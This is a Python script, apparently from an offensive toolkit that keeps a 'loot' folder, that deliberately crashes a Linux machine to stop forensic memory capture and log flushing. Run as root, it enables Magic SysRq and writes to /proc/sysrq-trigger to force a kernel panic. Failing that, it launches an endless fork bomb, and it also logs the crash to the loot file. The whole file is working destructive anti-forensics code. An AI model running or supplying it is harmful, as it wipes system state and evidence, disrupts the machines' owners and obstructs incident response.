import os
import sys
import subprocess

def trigger_panic():
    """
    Weaponized Kernel Panic: Forces an immediate system crash 
    to prevent forensic memory capture or log flushing.
    """
    if os.geteuid() != 0:
        print("[-] ROOT REQUIRED: Kernel-level disruption requires UID 0.")
        sys.exit(1)

    print("[!] INITIATING KERNEL PANIC: System state will be lost.")

    # Log to project loot before the crash (if possible)
    try:
        loot_path = "../../../loot/forensic_history.log"
        with open(loot_path, "a") as log:
            log.write(f"Type: KERNEL_PANIC | Triggered_By: {os.getlogin()} | Status: CRASHING\n")
    except:
        pass

    # Method 1: The Magic SysRq (Standard Kernel Interface)
    # We enable all SysRq functions and then trigger a 'Panic' (c)
    try:
        with open("/proc/sys/kernel/sysrq", "w") as f:
            f.write("1")
        
        # Trigger the crash
        with open("/proc/sysrq-trigger", "w") as f:
            f.write("c")
    except Exception as e:
        print(f"[-] SysRq Failed: {e}. Attempting Method 2...")

    # Method 2: Fork Bomb to OOM (Fallback)
    # If SysRq is disabled/blocked, we overwhelm the kernel memory manager
    # to force a panic via the Out-Of-Memory (OOM) killer.
    while True:
        os.fork()

if __name__ == "__main__":
    confirm = input("[?] Confirm System Destruction? (y/N): ")
    if confirm.lower() == 'y':
        trigger_panic()
    else:
        print("[*] Crash Aborted.")
